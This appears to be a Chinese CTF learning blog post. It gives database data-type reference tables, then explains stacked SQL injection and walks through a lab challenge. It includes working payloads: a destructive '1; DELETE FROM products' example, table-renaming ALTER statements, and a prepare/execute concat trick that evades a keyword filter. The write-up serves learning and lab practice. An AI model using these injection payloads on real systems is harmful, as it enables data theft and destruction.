<td align="left">Memo 用于更大数量的文本。最多存储 65,536 个字符。<strong>注释：</strong>无法对 memo 字段进行排序。不过它们是可搜索的。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Byte</td>
<td align="left">允许 0 到 255 的数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">Integer</td>
<td align="left">允许介于 -32,768 与 32,767 之间的全部数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">Long</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 之间的全部数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Single</td>
<td align="left">单精度浮点。处理大多数小数。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Double</td>
<td align="left">双精度浮点。处理大多数小数。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Currency</td>
<td align="left">用于货币。支持 15 位的元，外加 4 位小数。<strong>提示：</strong>您可以选择使用哪个国家的货币。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">AutoNumber</td>
<td align="left">AutoNumber 字段自动为每条记录分配数字，通常从 1 开始。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Date/Time</td>
<td align="left">用于日期和时间</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Yes/No</td>
<td align="left">逻辑字段，可以显示为 Yes/No、True/False 或 On/Off。在代码中，使用常量 True 和 False （等价于 1 和 0）。<strong>注释：</strong>Yes/No 字段中不允许 Null 值</td>
<td align="left">1 比特</td>
</tr>
<tr>
<td align="left">Ole Object</td>
<td align="left">可以存储图片、音频、视频或其他 BLOBs（Binary Large OBjects）。</td>
<td align="left">最多 1GB</td>
</tr>
<tr>
<td align="left">Hyperlink</td>
<td align="left">包含指向其他文件的链接，包括网页。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lookup Wizard</td>
<td align="left">允许您创建一个可从下拉列表中进行选择的选项列表。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
<hr>
<h4 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h4><p>在 MySQL 中，有三种主要的类型：Text（文本）、Number（数字）和 Date/Time（日期/时间）类型。</p>
<p><strong>Text 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR(size)</td>
<td align="left">保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>
</tr>
<tr>
<td align="left">VARCHAR(size)</td>
<td align="left">保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">存放最大长度为 255 个字符的字符串。</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">存放最大长度为 65,535 个字符的字符串。</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 65,535 字节的数据。</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">存放最大长度为 16,777,215 个字符的字符串。</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 16,777,215 字节的数据。</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">存放最大长度为 4,294,967,295 个字符的字符串。</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。</td>
</tr>
<tr>
<td align="left">ENUM(x,y,z,etc.)</td>
<td align="left">允许您输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。<strong>注释：</strong>这些值是按照您输入的顺序排序的。可以按照此格式输入可能的值： ENUM(‘X’,’Y’,’Z’)</td>
</tr>
<tr>
<td align="left">SET</td>
<td align="left">与 ENUM 类似，不同的是，SET 最多只能包含 64 个列表项且 SET 可存储一个以上的选择。</td>
</tr>
</tbody></table>
<p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TINYINT(size)</td>
<td align="left">带符号-128到127 ，无符号0到255。</td>
</tr>
<tr>
<td align="left">SMALLINT(size)</td>
<td align="left">带符号范围-32768到32767，无符号0到65535, size 默认为 6。</td>
</tr>
<tr>
<td align="left">MEDIUMINT(size)</td>
<td align="left">带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9</td>
</tr>
<tr>
<td align="left">INT(size)</td>
<td align="left">带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11</td>
</tr>
<tr>
<td align="left">BIGINT(size)</td>
<td align="left">带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20</td>
</tr>
<tr>
<td align="left">FLOAT(size,d)</td>
<td align="left">带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DOUBLE(size,d)</td>
<td align="left">带有浮动小数点的大数字。在 size 参数中规显示定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DECIMAL(size,d)</td>
<td align="left">作为字符串存储的 DOUBLE 类型，允许固定的小数点。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>注意：</strong>以上的 size 代表的并不是存储在数据库中的具体的长度，如 int(4) 并不是只能存储4个长度的数字。</p>
<p>实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 btyes 的存储空间。就是在显示给用户的方式有点不同外，int(M) 跟 int 数据类型是相同的。</p>
<p>例如：</p>
<p>1、int的值为10 （指定zerofill）</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; int（<span class="number">9</span>）显示结果为<span class="number">000000010</span></span><br><span class="line">&gt; int（<span class="number">3</span>）显示结果为<span class="number">010</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>就是显示的长度不一样而已 都是占用四个字节的空间</p>
</blockquote>
<p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE()</td>
<td align="left">日期。格式：YYYY-MM-DD<strong>注释：</strong>支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td align="left">DATETIME()</td>
<td align="left"><em>日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS*</em>注释：**支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td align="left">TIMESTAMP()</td>
<td align="left"><em>时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的秒数来存储。格式：YYYY-MM-DD HH:MM:SS*</em>注释：**支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC</td>
</tr>
<tr>
<td align="left">TIME()</td>
<td align="left">时间。格式：HH:MM:SS<strong>注释：</strong>支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td align="left">YEAR()</td>
<td align="left">2 位或 4 位格式的年。<strong>注释：</strong>4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>
</tr>
</tbody></table>
<p>即便 DATETIME 和 TIMESTAMP 返回相同的格式，它们的工作方式很不同。在 INSERT 或 UPDATE 查询中，TIMESTAMP 自动把自身设置为当前的日期和时间。TIMESTAMP 也接受不同的格式，比如 YYYYMMDDHHMMSS、YYMMDDHHMMSS、YYYYMMDD 或 YYMMDD。</p>
<hr>
<h4 id="SQL-Server-数据类型"><a href="#SQL-Server-数据类型" class="headerlink" title="SQL Server 数据类型"></a>SQL Server 数据类型</h4><p><strong>String 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">char(n)</td>
<td align="left">固定长度的字符串。最多 8,000 个字符。</td>
<td align="left">Defined width</td>
</tr>
<tr>
<td align="left">varchar(n)</td>
<td align="left">可变长度的字符串。最多 8,000 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">varchar(max)</td>
<td align="left">可变长度的字符串。最多 1,073,741,824 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">text</td>
<td align="left">可变长度的字符串。最多 2GB 文本数据。</td>
<td align="left">4 bytes + number of chars</td>
</tr>
<tr>
<td align="left">nchar</td>
<td align="left">固定长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left">Defined width x 2</td>
</tr>
<tr>
<td align="left">nvarchar</td>
<td align="left">可变长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">nvarchar(max)</td>
<td align="left">可变长度的 Unicode 字符串。最多 536,870,912 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ntext</td>
<td align="left">可变长度的 Unicode 字符串。最多 2GB 文本数据。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">bit</td>
<td align="left">允许 0、1 或 NULL</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">binary(n)</td>
<td align="left">固定长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary</td>
<td align="left">可变长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary(max)</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">image</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">tinyint</td>
<td align="left">允许从 0 到 255 的所有数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">smallint</td>
<td align="left">允许介于 -32,768 与 32,767 的所有数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 的所有数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">bigint</td>
<td align="left">允许介于 -9,223,372,036,854,775,808 与 9,223,372,036,854,775,807 之间的所有数字。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">decimal(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">numeric(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">smallmoney</td>
<td align="left">介于 -214,748.3648 与 214,748.3647 之间的货币数据。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">money</td>
<td align="left">介于 -922,337,203,685,477.5808 与 922,337,203,685,477.5807 之间的货币数据。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">float(n)</td>
<td align="left">从 -1.79E + 308 到 1.79E + 308 的浮动精度数字数据。n 参数指示该字段保存 4 字节还是 8 字节。float(24) 保存 4 字节，而 float(53) 保存 8 字节。n 的默认值是 53。</td>
<td align="left">4 或 8 字节</td>
</tr>
<tr>
<td align="left">real</td>
<td align="left">从 -3.40E + 38 到 3.40E + 38 的浮动精度数字数据。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
<p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">datetime</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 3.33 毫秒。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">datetime2</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 100 纳秒。</td>
<td align="left">6-8 字节</td>
</tr>
<tr>
<td align="left">smalldatetime</td>
<td align="left">从 1900 年 1 月 1 日 到 2079 年 6 月 6 日，精度为 1 分钟。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">date</td>
<td align="left">仅存储日期。从 0001 年 1 月 1 日 到 9999 年 12 月 31 日。</td>
<td align="left">3 bytes</td>
</tr>
<tr>
<td align="left">time</td>
<td align="left">仅存储时间。精度为 100 纳秒。</td>
<td align="left">3-5 字节</td>
</tr>
<tr>
<td align="left">datetimeoffset</td>
<td align="left">与 datetime2 相同，外加时区偏移。</td>
<td align="left">8-10 字节</td>
</tr>
<tr>
<td align="left">timestamp</td>
<td align="left">存储唯一的数字，每当创建或修改某行时，该数字会更新。timestamp 值基于内部时钟，不对应真实时间。每个表只能有一个 timestamp 变量。</td>
<td align="left"></td>
</tr>
</tbody></table>
<h4 id="其他数据类型："><a href="#其他数据类型：" class="headerlink" title="其他数据类型："></a><strong>其他数据类型：</strong></h4><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sql_variant</td>
<td align="left">存储最多 8,000 字节不同数据类型的数据，除了 text、ntext 以及 timestamp。</td>
</tr>
<tr>
<td align="left">uniqueidentifier</td>
<td align="left">存储全局唯一标识符 (GUID)。</td>
</tr>
<tr>
<td align="left">xml</td>
<td align="left">存储 XML 格式化数据。最多 2GB。</td>
</tr>
<tr>
<td align="left">cursor</td>
<td align="left">存储对用于数据库操作的指针的引用。</td>
</tr>
<tr>
<td align="left">table</td>
<td align="left">存储结果集，供稍后处理。</td>
</tr>
</tbody></table>
<p>接下来还有一手SQL函数，明儿再看，先整堆叠注入。。。。（SQL没基础，所以先学学）</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>Stacked injection–堆叠注入–堆查询注入</p>
<p>原文地址;<a href="http://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">http://www.sqlinjection.net/stacked-queries/</a>   本篇属于集合原作者的思路和个人想法结合的一篇产物。Stacked injection 汉语翻译过来后，国内有的称为堆查询注入，也有称之为堆叠注入。个人认为称之为堆叠注入更为准确。堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。</p>
<h2 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>（咦，那感觉，挺简单的？）</p>
<h2 id="0x02-堆叠注入的局限性"><a href="#0x02-堆叠注入的局限性" class="headerlink" title="0x02 堆叠注入的局限性"></a>0x02 堆叠注入的局限性</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><img src="/2019/07/28/The_First_Day_for_Web/2.jpg" alt="img"></p>
<p>Ps：此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。</p>
<p>在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>那么回到原题，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后随便试了试发现过滤</span><br><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure>

<p><a href="http://web16.buuoj.cn/?inject=1where" target="_blank" rel="noopener">http://web16.buuoj.cn/?inject=1where</a><br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure></p>
<p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后师傅们很牛逼的就知道他是堆叠注入了（学）</span><br></pre></td></tr></table></figure></p>
<p>师傅们之所以知道是堆叠注入，应该是发现show函数没被过滤并且union被过滤了叭，所以莫得联合注入，就去堆叠注入了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#			//表示这一句没啥作用，因为这一题flag就在默认库里头</span></span><br><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这些也都是简单地show语句查询，去了解一下show语句（为啥flag不能直接show）</p>
<h3 id="MySQL中show语法"><a href="#MySQL中show语法" class="headerlink" title="MySQL中show语法"></a>MySQL中show语法</h3><ol>
<li>show tables或show tables from database_name; – 显示当前数据库中所有表的名称。 </li>
<li>show databases; – 显示mysql中所有数据库的名称。 </li>
<li>show columns from table_name from database_name; 或show columns from database_name.table_name; – 显示表中列名称。 </li>
<li>show grants for user_name; – 显示一个用户的权限，显示结果类似于grant 命令。 </li>
<li>show index from table_name; – 显示表的索引。 </li>
<li>show status; – 显示一些系统特定资源的信息，例如，正在运行的线程数量。 </li>
<li>show variables; – 显示系统变量的名称和值。 </li>
<li>show processlist; – 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。 </li>
<li>show table status; – 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。 </li>
<li>show privileges; – 显示服务器所支持的不同权限。 </li>
<li>show create database database_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
<li>show create table table_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
<li>show engines; – 显示安装以后可用的存储引擎和默认引擎。 </li>
<li>show innodb status; – 显示innoDB存储引擎的状态。 </li>
<li>show logs; – 显示BDB存储引擎的日志。 </li>
<li>show warnings; – 显示最后一个执行的语句所产生的错误、警告和通知。 </li>
<li>show errors; – 只显示最后一个执行语句所产生的错误。 </li>
<li>show [storage] engines; –显示安装后的可用存储引擎和默认引擎。</li>
</ol>
<p>除了status,processlist和grants外，其它的都可以带有like wild选项，它可以使用SQL的’%’和’_’字符；</p>
<p>show databases like ‘%t’;</p>
<p>将会列出所有数据库名字末尾为’t’字符的数据库</p>
<p>当然了，在这些sql中，你也可以用db_name.table_name来代替 table_name from db_name这样写会更简便些!</p>
<p>如果一个用户没有一个表的任何权限，表将不在SHOW TABLES或mysqlshow db_name中的输出中显示</p>
<p>大家可能还记得describe table_name ，它实现的是与show columns from db_name.table_name一样的效果</p>
<p>show status将可以用mysqlshow –status 来得到同样的效果</p>
<ul>
<li>列 含义</li>
<li>name 表名</li>
<li>Type 表的类型 (ISAM，MyISAM或HEAP)</li>
<li>Row_format 行存储格式 (固定, 动态, 或压缩）</li>
<li>Rows 行数量</li>
<li>Avg_row_length 平均行长度</li>
<li>Data_length 数据文件的长度</li>
<li>Max_data_length 数据文件的最大长度</li>
<li>Index_length 索引文件的长度</li>
<li>Data_free 已分配但未使用了字节数</li>
<li>Auto_increment 下一个 autoincrement(自动加1）值</li>
<li>Create_time 表被创造的时间</li>
<li>Update_time 数据文件最后更新的时间</li>
<li>Check_time 最后对表运行一个检查的时间</li>
<li>Create_options 与CREATE TABLE一起使用的额外选项</li>
<li>Comment 当创造表时，使用的注释 (或为什么MySQL不能存取表信息的一些信息)。</li>
</ul>
<p>SHOW FIELDS是SHOW COLUMNS一个同义词，SHOW KEYS是SHOW INDEX一个同义词。你也可以用mysqlshow db_name tbl_name或mysqlshow -k db_name tbl_name 列出一张表的列或索引。</p>
<p>SHOW INDEX以非常相似于ODBC的SQLStatistics调用的格式返回索引信息。下面的列被返回：</p>
<p>列 含义</p>
<p>Table   表名</p>
<p>Non_unique  0，如果索引不能包含重复。</p>
<p>Key_name    索引名</p>
<p>Seq_in_index    索引中的列顺序号, 从 1 开始。</p>
<p>Column_name 列名。</p>
<p>Collation   列怎样在索引中被排序。在MySQL中，这可以有值A（升序) 或NULL（不排序)。</p>
<p>Cardinality 索引中唯一值的数量。这可通过运行isamchk -a更改.</p>
<p>Sub_part    如果列只是部分被索引，索引字符的数量。NULL，如果整个键被索引。</p>
<p>嗯，熟悉的语句不多，show似乎也确实看不了字段内容。（怪不得师傅们都用了别的方法）</p>
<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4><ol>
<li>改数据库：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>（由于是只回显前面的，所以最后一个语句似乎不用写，然后id=1意味着原来的flag=1，所以无回显，需要注入1’ or ‘1’ =’1）</p>
<p>改数据库的语句：改表名大概就如师傅这么写吧，rename table ‘表名’ to ‘新表名‘；</p>
<p>看看改列名，</p>
<p>各个数据库不一样。<br>oracle: ALTER TABLE 表名 RENAME COLUMN 列名 TO 新列名</p>
<p>sqlserver:exec sp_rename ‘[表名].[列名]’,’[表名].[新列名]’</p>
<p><strong>mysql:ALTER TABLE 表名 CHANGE ’列名‘ ’新列名‘ 列类型</strong></p>
<p>DEFAULT CHARACTER SET utf8：数据库字符集。设置数据库的默认编码为utf8，utf8中间不要”-“；</p>
<p>COLLATE utf8_general_ci:数据库校对规则。ci是case insensitive的缩写，意思是大小写不敏感；相对的是cs，即case sensitive，大小写敏感；还有一种是utf8_bin，是将字符串中的每一个字符用二进制数据存储，区分大小写。</p>
<p>NOT NULL 非空呗</p>
<p>改列名加上就对了23333  </p>
<p>ALTER TABLE 表名 CHANGE ’列名‘  ’新列名‘  列类型 CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</p>
<h3 id="mysql预编译"><a href="#mysql预编译" class="headerlink" title="mysql预编译"></a>mysql预编译</h3><ol start="2">
<li>预编译（mysql）</li>
</ol>
<p>SQL代码</p>
<ol>
<li>prepare presql from ‘select a from table’;  </li>
</ol>
<p>上面这句SQL创建了一个<strong>预编译</strong>的SQL。名为presql，这个<strong>预编译</strong>SQL的存活期就是当前的会话，也就是当前的数据库连接。<br>如果连接一断开 ，那就会消失。</p>
<p>from后面跟的就是要进行编译的那个SQL，这个值可以是一个字面的字符串值 ，就像上面；也可以是一个变量。<br>比如：</p>
<p>SQL代码</p>
<p>set @sql = ‘select * from admin’;</p>
<p>prepare presql from @sql; </p>
<p>from后面跟的只能是字面值或者变量这两种情况 ，不能直接跟十六进制的字符串。</p>
<p>比如：</p>
<p>SQL代码</p>
<ol>
<li>prepare testhex from 0x73656C656374202A2066726F6D2061;  </li>
</ol>
<p>这样是错误 的，可以先用变量来接收这个十六进制串的值，然后再进行SQL的编译。</p>
<p>SQL代码</p>
<ol>
<li>set @sql = 0x73656C656374202A2066726F6D2061;prepare testhex from @sql;  </li>
</ol>
<p>注意：被编译的SQL只能是一条单独的语句，不能多条语句一起编译，比如：</p>
<p>SQL代码</p>
<ol>
<li>prepare mutisql from ‘select 1;select 2’;  </li>
</ol>
<p>这是错误的。</p>
<p>可以被<strong>预编译</strong>的SQL语句的类型也是有限制的，并不是所有的SQL都可以被编译。<br>下面这些类型的SQL是可以编译的：<br>create table,delete,do,insert,replace,select,set,update 和多数的show语句。</p>
<p>（这题用了select）</p>
<p>带参数的<strong>预编译</strong>SQL：</p>
<p>SQL代码</p>
<p>1.1 prepare pstmt from ‘select a from table where id = ?’;  </p>
<p>参数用?代替。注意，就算参数的值是一个字符串，也不用加引号。加了反而有错。</p>
<p>在调用的时候利用using关键字向SQL传递参数 。</p>
<p>SQL代码</p>
<p>1.2 set @value = 1;execute pstmt using @value;  </p>
<p>先声明一个变量来保存参数的值，然后通过后面的using @value来传SQL传递参数 。<br>注意这里的参数的值只能由变量来传递，不能直接写成execute pstmt using 1;<br>这是错误的。</p>
<p>多个参数之间用逗号隔开。</p>
<p>删除<strong>预编译</strong>SQL的办法：</p>
<p>SQL代码</p>
<p>deallocate|drop prepare pstmt;   </p>
<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> presql <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> presql;				//执行语句<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>  拿到flag</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> presql;</span><br></pre></td></tr></table></figure>

<p>附：</p>
<p>concat函数</p>
<p>concat(str1,str2,…)返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<p>strstr()函数</p>
<p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符及字符串及剩余部分，否则返回 FALSE。</p>
<p>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 <a href="https://www.runoob.com/php/func-string-stristr.html" target="_blank" rel="noopener">stristr()</a> 函数。</p>
<p>语法</p>
<p>strstr(<em>string,search,before_search</em>)</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>必需。规定被搜索的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td><em>search</em></td>
<td>必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td><em>before_search</em></td>
<td>可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody></table>
<p>这里检测了</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strstr</span><span class="params">(<span class="variable">$inject</span>, <span class="string">"set"</span>)</span></span> &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>

<p>应该是返回ture了，所以蹦出来，所以大概就要绕过他（出来个这么个函数大概就这意思吧，不然也没别的操作了）</p>
<p>于是利用他的区分大小写加上sql语句的不区分大小写，就能绕过了。</p>
